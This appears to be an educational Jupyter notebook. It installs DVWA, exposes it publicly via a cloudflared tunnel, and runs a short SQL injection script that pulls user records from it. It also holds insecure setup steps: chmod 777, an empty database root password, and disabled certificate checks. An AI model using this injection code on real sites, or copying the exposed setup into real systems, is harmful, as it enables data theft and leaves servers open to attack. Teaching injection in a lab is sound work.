# SQL Injection exploit script

> **Authorized lab use only.** This notebook is an educational demonstration. Run it only with synthetic data or systems you own and are permitted to test.


In [ ]:
# Install packages
!apt update
!apt install -y apache2 php php-mysqli mysql-server git wget

# Start services
!service apache2 start
!service mysql start

# Setup DVWA
!git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
!cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php

# Pre-configure database credentials
!sed -i 's/$_DVWA\['\''db_user'\''\] = '\''root'\'';/$_DVWA['\''db_user'\''] = '\''root'\'';/' /var/www/html/dvwa/config/config.inc.php
!sed -i 's/$_DVWA\['\''db_password'\''\] = '\''p@ssw0rd'\'';/$_DVWA['\''db_password'\''] = '\'''\'';/' /var/www/html/dvwa/config/config.inc.php

# Create DVWA database manually
!mysql -u root -e "CREATE DATABASE IF NOT EXISTS dvwa;"
!mysql -u root dvwa < /var/www/html/dvwa/dvwa.sql

# Set permissions
!chmod -R 777 /var/www/html/dvwa

# Restart services
!service apache2 restart
!service mysql restart

# Download cloudflared
!wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
!dpkg -i cloudflared-linux-amd64.deb

# -------- Python Part --------
import subprocess
import re
import time
import threading
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run_tunnel():
    global tunnel_output
    tunnel = subprocess.Popen(
        ['cloudflared', 'tunnel', '--url', 'http://localhost'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    for line in iter(tunnel.stdout.readline, b''):
        decoded = line.decode().strip()
        if "trycloudflare.com" in decoded:
            tunnel_output += decoded + "\n"

tunnel_output = ""
threading.Thread(target=run_tunnel).start()

timeout = 60
start_time = time.time()
public_url = None

while time.time() - start_time < timeout:
    urls = re.findall(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', tunnel_output)
    if urls:
        public_url = urls[0]
        break
    time.sleep(1)

if not public_url:
    raise Exception(f"[!] Could not get public URL. Tunnel output:\n{tunnel_output}")

print(f"[+] Public URL: {public_url}")

# Wait DNS Propagation
time.sleep(10)

# ---- SQL Injection Exploit ----
target_url = f"{public_url}/dvwa/vulnerabilities/sqli/"

for user_id in range(1, 5):
    payload = f"1' OR id={user_id}-- -"
    params = {'id': payload, 'Submit': 'Submit'}
    try:
        r = requests.get(target_url, params=params, verify=False, timeout=10)
        if "First name" in r.text:
            print(f"[+] Found user with ID {user_id}")
            start = r.text.find("First name")
            print(r.text[start:start+200])
        else:
            print(f"[-] No user found with ID {user_id}")
    except Exception as e:
        print(f"[!] Request failed for ID {user_id}: {e}")
